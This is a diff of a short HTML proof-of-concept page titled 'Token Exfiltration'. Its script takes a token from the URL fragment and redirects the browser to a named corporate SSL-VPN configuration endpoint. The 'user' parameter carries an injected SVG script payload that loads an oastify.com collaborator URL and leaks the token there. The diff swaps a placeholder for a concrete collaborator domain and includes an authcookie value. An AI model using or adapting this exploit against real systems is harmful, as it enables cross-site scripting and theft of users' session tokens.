@@ -1,18 +1,24 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Exfil Token</title>
+    <meta charset="UTF-8">
+    <title>Token Exfiltration</title>
     <script>
+      // Grab token from URL fragment
       const token = location.hash;
-      const exfilUrl = "https://YOUR-COLLAB-DOMAIN.oastify.com?token=" + encodeURIComponent(token);
-      const redirectTo = "https://tokyo-1.vpn.adobe.com/ssl-vpn/getconfig.esp?" +
+
+      // Build final URL with payload
+      const exfilUrl = "https://wccyw5cm002fk4c7ocgygh037udm1dp2.oastify.com/?token=" + encodeURIComponent(token);
+
+      const redirectUrl = "https://tokyo-1.vpn.adobe.com/ssl-vpn/getconfig.esp?" +
         "client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux" +
         "&os-version=linux-64&hmac-algo=sha1,md5&enc-algo=aes-128-cbc,aes-256-cbc" +
         "&authcookie=12cea70227d3aafbf25082fac1b6f51d&portal=us-vpn-gw-N" +
-        "&user=%3Csvg%20xmlns='http://www.w3.org/2000/svg'%3E<script src='" + exfilUrl + "'></script>%3C/svg%3E" +
+        "&user=%3Csvg%20xmlns='http://www.w3.org/2000/svg'%3E<script%20src='" + exfilUrl + "'%3E%3C/script%3E%3C/svg%3E" +
         "&domain=(empty_domain)&computer=computer";
 
-      window.location = redirectTo;
+      // Redirect to payload
+      window.location.href = redirectUrl;
     </script>
   </head>
   <body>
